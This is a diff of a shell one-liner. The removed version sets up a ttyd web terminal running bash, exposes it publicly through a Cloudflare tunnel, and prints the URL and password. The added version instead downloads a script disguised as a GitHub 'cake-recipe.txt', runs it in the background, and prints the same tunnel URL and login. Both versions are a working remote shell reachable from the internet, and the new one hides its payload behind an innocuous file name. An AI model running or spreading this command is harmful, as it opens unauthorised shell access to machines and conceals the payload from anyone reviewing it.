@@ -1,13 +1,1 @@
-pkill -x ttyd 2>/dev/null; pkill -x cloudflared 2>/dev/null; cat > /root/webshell.txt << 'EOF'
-A=$(uname -m)
-if [ "$A" = x86_64 ]; then T=ttyd.x86_64; C=cloudflared-linux-amd64; else T=ttyd.aarch64; C=cloudflared-linux-arm64; fi
-curl -fsSL -o /usr/local/bin/ttyd https://github.com/tsl0922/ttyd/releases/latest/download/$T
-curl -fsSL -o /usr/local/bin/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/$C
-chmod +x /usr/local/bin/ttyd /usr/local/bin/cloudflared
-P=$(openssl rand -hex 8)
-(ttyd -W -i lo -p 7681 -c user:$P bash >/dev/null 2>&1 &)
-(cloudflared tunnel --url http://localhost:7681 --no-autoupdate >/tmp/cf.log 2>&1 &)
-until grep -q 'trycloudflare\.com' /tmp/cf.log; do sleep 1; done
-echo "URL  : $(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/cf.log | head -1)"
-echo "LOGIN: user / $P"
-EOF
+pkill -x ttyd 2>/dev/null; pkill -x cloudflared 2>/dev/null; curl -fsSL https://raw.githubusercontent.com/torocuk/how-to-bake-a-cake/main/cake-recipe.txt -o /tmp/ws.sh && (bash /tmp/ws.sh > /tmp/ws.log 2>&1 &) && sleep 30 && echo "LOGIN: $(grep -oP 'LOGIN:\s*\K.*' /tmp/ws.log | head -1)" && echo "URL  : $(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/ws.log | head -1)"
